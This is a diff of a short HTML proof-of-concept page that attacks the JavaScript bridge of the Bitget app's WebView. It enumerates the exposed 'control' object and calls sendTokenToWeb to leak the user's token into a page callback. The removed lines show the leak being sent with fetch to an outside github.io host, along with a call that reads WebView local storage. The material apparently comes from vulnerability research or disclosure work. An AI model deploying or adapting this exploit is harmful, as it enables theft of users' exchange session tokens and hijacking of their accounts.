@@ -3,28 +3,20 @@
 <h2>Bitget WebView JSBridge PoC</h2>
 <pre id="out">running...</pre>
 <script>
-var EXFIL = "https://createnewdemo.github.io/bgjspoc/?leak=";
 function log(s){document.getElementById('out').textContent += "\n" + s;}
 function pocCallback(data){
   log("LEAK RECEIVED:");
-  try {
-    var payload = JSON.stringify(data);
-    log(payload);
-    // use image beacon so we can observe via Pages? no log. Send via fetch to same origin then check nothing.
-    fetch(EXFIL + encodeURIComponent(payload)).catch(function(){});
-  } catch(e){ log(String(data)); }
+  try { log(JSON.stringify(data)); } catch(e){ log(String(data)); }
 }
 setTimeout(function(){
   if (window.control) {
     log("control object present");
     var apis = [];
     for (var k in control) { apis.push(k); }
-    log("control keys: " + apis.join(","));
+    log("TOTAL KEYS: " + apis.length);
+    for (var i = 0; i < apis.length; i++) { log("[" + i + "] " + apis[i]); }
     try { control.sendTokenToWeb('pocCallback'); log("sendTokenToWeb called"); } catch(e){ log("sTTW err: "+e); }
-    try { control.getWebLocalStorage('pocCallback','x'); log("getWebLocalStorage called"); } catch(e){ log("gWLS err: "+e); }
-  } else {
-    log("NO control object");
-  }
+  } else { log("NO control object"); }
   log("done");
 }, 800);
 </script>
